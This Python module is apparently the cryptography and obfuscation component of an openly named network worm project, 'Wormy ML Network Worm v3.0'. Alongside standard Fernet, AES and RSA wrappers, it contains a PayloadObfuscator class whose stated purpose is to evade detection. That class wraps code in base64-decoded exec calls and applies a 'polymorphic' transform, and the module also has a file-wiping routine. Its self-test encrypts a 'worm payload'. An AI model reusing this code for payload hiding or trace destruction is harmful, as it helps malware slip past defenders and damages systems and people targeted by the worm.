"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
ML Network Worm - Cryptographic Utilities
Encryption, obfuscation, and secure communication
"""


import base64
import hashlib
import os
import random
import sys
from typing import Optional, Tuple

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class CryptoManager:
    """Manages all cryptographic operations"""

    def __init__(self):
        self.symmetric_key = None
        self.private_key = None
        self.public_key = None

    # Symmetric Encryption (Fernet)

    def generate_symmetric_key(self) -> bytes:
        """Generate a new symmetric key"""
        self.symmetric_key = Fernet.generate_key()
        return self.symmetric_key

    def encrypt_symmetric(self, data: bytes, key: bytes = None) -> bytes:
        """Encrypt data with symmetric key"""
        if key is None:
            key = self.symmetric_key

        cipher = Fernet(key)
        return cipher.encrypt(data)

    def decrypt_symmetric(self, encrypted_data: bytes, key: bytes = None) -> bytes:
        """Decrypt data with symmetric key"""
        if key is None:
            key = self.symmetric_key

        cipher = Fernet(key)
        return cipher.decrypt(encrypted_data)

    # AES Encryption

    def encrypt_aes(self, data: bytes, key: bytes) -> Tuple[bytes, bytes, bytes]:
        """
        Encrypt data with AES-256
        Returns: (ciphertext, nonce, tag)
        """
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return ciphertext, cipher.nonce, tag

    def decrypt_aes(self, ciphertext: bytes, key: bytes, nonce: bytes, tag: bytes) -> bytes:
        """Decrypt AES-256 encrypted data"""
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

    # Asymmetric Encryption (RSA)

    def generate_rsa_keypair(self, key_size: int = 2048) -> Tuple[bytes, bytes]:
        """
        Generate RSA key pair
        Returns: (private_key_pem, public_key_pem)
        """
        self.private_key = rsa.generate_private_key(public_exponent=65537, key_size=key_size)
        self.public_key = self.private_key.public_key()

        # Serialize keys
        private_pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )

        public_pem = self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )

        return private_pem, public_pem

    def encrypt_rsa(self, data: bytes, public_key_pem: bytes) -> bytes:
        """Encrypt data with RSA public key"""
        public_key = serialization.load_pem_public_key(public_key_pem)

        ciphertext = public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None
            ),
        )
        return ciphertext

    def decrypt_rsa(self, ciphertext: bytes, private_key_pem: bytes) -> bytes:
        """Decrypt data with RSA private key"""
        private_key = serialization.load_pem_private_key(private_key_pem, password=None)

        plaintext = private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None
            ),
        )
        return plaintext

    # Hashing

    @staticmethod
    def hash_sha256(data: bytes) -> str:
        """SHA-256 hash"""
        return hashlib.sha256(data).hexdigest()

    @staticmethod
    def hash_md5(data: bytes) -> str:
        """MD5 hash"""
        return hashlib.md5(data).hexdigest()

    # Key Derivation

    @staticmethod
    def derive_key(password: str, salt: bytes = None) -> Tuple[bytes, bytes]:
        """
        Derive encryption key from password
        Returns: (key, salt)
        """
        if salt is None:
            salt = os.urandom(16)

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = kdf.derive(password.encode())

        return key, salt

    # Obfuscation

    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """Simple XOR encryption"""
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

    @staticmethod
    def base64_encode(data: bytes) -> str:
        """Base64 encoding"""
        return base64.b64encode(data).decode()

    @staticmethod
    def base64_decode(data: str) -> bytes:
        """Base64 decoding"""
        return base64.b64decode(data.encode())

    @staticmethod
    def rot13(text: str) -> str:
        """ROT13 encoding"""
        result = []
        for char in text:
            if "a" <= char <= "z":
                result.append(chr((ord(char) - ord("a") + 13) % 26 + ord("a")))
            elif "A" <= char <= "Z":
                result.append(chr((ord(char) - ord("A") + 13) % 26 + ord("A")))
            else:
                result.append(char)
        return "".join(result)


class PayloadObfuscator:
    """Obfuscate payloads to evade detection"""

    @staticmethod
    def obfuscate_string(s: str) -> str:
        """Obfuscate a string"""
        # Base64 encode
        encoded = base64.b64encode(s.encode()).decode()
        # Add random padding
        padding = "".join([chr(random.randint(65, 90)) for _ in range(4)])
        return f"{padding}{encoded}{padding}"

    @staticmethod
    def deobfuscate_string(s: str) -> str:
        """Deobfuscate a string"""
        # Remove padding (first and last 4 chars)
        encoded = s[4:-4]
        # Base64 decode
        return base64.b64decode(encoded).decode()

    @staticmethod
    def obfuscate_code(code: str) -> str:
        """Obfuscate Python code"""
        # Simple obfuscation: base64 encode and wrap in exec
        encoded = base64.b64encode(code.encode()).decode()
        return f"exec(__import__('base64').b64decode('{encoded}').decode())"

    @staticmethod
    def polymorphic_transform(code: str) -> str:
        """Apply polymorphic transformation to code"""
        import random

        # Add random comments
        lines = code.split("\n")
        transformed = []

        for line in lines:
            if random.random() < 0.3:  # 30% chance to add comment
                transformed.append(f"# {random.randint(1000, 9999)}")
            transformed.append(line)

        # Add random variable names
        code_with_comments = "\n".join(transformed)

        return code_with_comments


# Global crypto manager
crypto = CryptoManager()


def generate_random_key(length: int = 32) -> bytes:
    """Generate random key"""
    return get_random_bytes(length)


def secure_delete(filepath: str, passes: int = 3):
    """Securely delete a file by overwriting"""
    if not os.path.exists(filepath):
        return

    file_size = os.path.getsize(filepath)

    # Overwrite with random data
    for _ in range(passes):
        with open(filepath, "wb") as f:
            f.write(os.urandom(file_size))

    # Finally delete
    os.remove(filepath)


if __name__ == "__main__":
    # Test crypto operations
    crypto = CryptoManager()

    # Test symmetric encryption
    key = crypto.generate_symmetric_key()
    message = b"Secret worm payload"
    encrypted = crypto.encrypt_symmetric(message)
    decrypted = crypto.decrypt_symmetric(encrypted)
    print(f"Symmetric: {message} -> {encrypted[:20]}... -> {decrypted}")

    # Test RSA
    private_key, public_key = crypto.generate_rsa_keypair()
    encrypted_rsa = crypto.encrypt_rsa(message, public_key)
    decrypted_rsa = crypto.decrypt_rsa(encrypted_rsa, private_key)
    print(f"RSA: {message} -> {decrypted_rsa}")

    # Test hashing
    print(f"SHA256: {crypto.hash_sha256(message)}")

    # Test obfuscation
    obfuscator = PayloadObfuscator()
    obf = obfuscator.obfuscate_string("malicious_payload")
    print(f"Obfuscated: {obf}")
    print(f"Deobfuscated: {obfuscator.deobfuscate_string(obf)}")
